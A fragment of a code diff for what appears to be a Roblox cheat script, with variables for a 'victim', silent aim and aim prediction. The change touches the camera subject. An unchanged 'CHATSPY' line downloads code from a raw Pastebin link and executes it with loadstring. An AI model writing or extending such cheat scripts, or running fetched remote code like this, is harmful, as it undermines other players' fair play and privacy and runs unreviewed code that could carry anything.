@@ -17,7 +17,7 @@ local RS = game:GetService("RunService")
 local VICTIM = nil
 local silentVic = nil
 local prediction = 0.311505
-local normalCam = camera.CameraSubject.Value
+local normalCam = camera.CameraSubject
 
 -- CHATSPY
 loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))()
